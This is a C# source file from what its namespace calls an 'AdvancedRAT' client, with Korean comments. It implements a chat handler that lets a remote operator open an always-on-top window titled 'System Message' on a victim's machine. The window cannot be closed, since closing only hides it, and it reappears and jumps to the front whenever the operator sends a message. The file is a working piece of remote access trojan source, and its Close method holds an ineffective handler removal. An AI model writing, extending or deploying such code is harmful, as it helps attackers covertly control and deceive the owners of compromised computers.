using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;

namespace AdvancedRAT.Client.Handlers
{
    public class ChatHandler
    {
        private Form chatWindow;
        private RichTextBox chatBox;
        private TextBox inputBox;
        private Button sendButton;
        private bool isInitialized = false;
        
        public async Task<object> Initialize()
        {
            try
            {
                if (isInitialized)
                {
                    return new { success = true, message = "Chat already initialized" };
                }
                
                // 채팅 창 생성 (별도 스레드에서)
                var thread = new System.Threading.Thread(() =>
                {
                    chatWindow = new Form
                    {
                        Text = "System Message",
                        Size = new Size(500, 400),
                        StartPosition = FormStartPosition.CenterScreen,
                        TopMost = true,
                        FormBorderStyle = FormBorderStyle.Sizable,
                        BackColor = Color.White
                    };
                    
                    chatBox = new RichTextBox
                    {
                        Dock = DockStyle.Fill,
                        ReadOnly = true,
                        Font = new Font("Segoe UI", 10),
                        BackColor = Color.FromArgb(240, 240, 240),
                        BorderStyle = BorderStyle.None
                    };
                    
                    var bottomPanel = new Panel
                    {
                        Dock = DockStyle.Bottom,
                        Height = 50,
                        BackColor = Color.White,
                        Padding = new Padding(5)
                    };
                    
                    inputBox = new TextBox
                    {
                        Dock = DockStyle.Fill,
                        Font = new Font("Segoe UI", 10),
                        Multiline = false
                    };
                    
                    sendButton = new Button
                    {
                        Text = "Send",
                        Dock = DockStyle.Right,
                        Width = 80,
                        FlatStyle = FlatStyle.Flat,
                        BackColor = Color.FromArgb(0, 120, 215),
                        ForeColor = Color.White
                    };
                    sendButton.FlatAppearance.BorderSize = 0;
                    
                    // Enter 키로 전송
                    inputBox.KeyDown += (s, e) =>
                    {
                        if (e.KeyCode == Keys.Enter)
                        {
                            SendUserMessage();
                            e.Handled = true;
                            e.SuppressKeyPress = true;
                        }
                    };
                    
                    sendButton.Click += (s, e) => SendUserMessage();
                    
                    bottomPanel.Controls.Add(inputBox);
                    bottomPanel.Controls.Add(sendButton);
                    
                    chatWindow.Controls.Add(chatBox);
                    chatWindow.Controls.Add(bottomPanel);
                    
                    chatWindow.FormClosing += (s, e) =>
                    {
                        e.Cancel = true;
                        chatWindow.Hide();
                    };
                    
                    chatWindow.Show();
                    Application.Run(chatWindow);
                });
                
                thread.SetApartmentState(System.Threading.ApartmentState.STA);
                thread.IsBackground = true;
                thread.Start();
                
                await Task.Delay(500);
                isInitialized = true;
                
                return new { success = true, message = "Chat initialized" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> ShowMessage(string user, string message)
        {
            try
            {
                if (!isInitialized || chatWindow == null)
                {
                    return new { success = false, message = "Chat not initialized" };
                }
                
                chatWindow.Invoke((MethodInvoker)delegate
                {
                    string timestamp = DateTime.Now.ToString("HH:mm:ss");
                    chatBox.AppendText($"[{timestamp}] {user}: {message}\n");
                    chatBox.ScrollToCaret();
                    
                    // 창이 숨겨져 있으면 표시
                    if (!chatWindow.Visible)
                    {
                        chatWindow.Show();
                    }
                    
                    // 창을 최상위로
                    chatWindow.BringToFront();
                });
                
                return new { success = true };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Maximize()
        {
            try
            {
                if (chatWindow != null)
                {
                    chatWindow.Invoke((MethodInvoker)delegate
                    {
                        chatWindow.WindowState = FormWindowState.Maximized;
                    });
                }
                return new { success = true };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Minimize()
        {
            try
            {
                if (chatWindow != null)
                {
                    chatWindow.Invoke((MethodInvoker)delegate
                    {
                        chatWindow.WindowState = FormWindowState.Minimized;
                    });
                }
                return new { success = true };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Normal()
        {
            try
            {
                if (chatWindow != null)
                {
                    chatWindow.Invoke((MethodInvoker)delegate
                    {
                        chatWindow.WindowState = FormWindowState.Normal;
                    });
                }
                return new { success = true };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Close()
        {
            try
            {
                if (chatWindow != null)
                {
                    chatWindow.Invoke((MethodInvoker)delegate
                    {
                        chatWindow.FormClosing -= null;
                        chatWindow.Close();
                        chatWindow.Dispose();
                    });
                    chatWindow = null;
                    isInitialized = false;
                }
                return new { success = true };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        private void SendUserMessage()
        {
            if (!string.IsNullOrEmpty(inputBox.Text))
            {
                string message = inputBox.Text;
                string timestamp = DateTime.Now.ToString("HH:mm:ss");
                chatBox.AppendText($"[{timestamp}] You: {message}\n");
                chatBox.ScrollToCaret();
                inputBox.Clear();
                
                // TODO: 서버로 메시지 전송 (필요시 구현)
            }
        }
    }
}
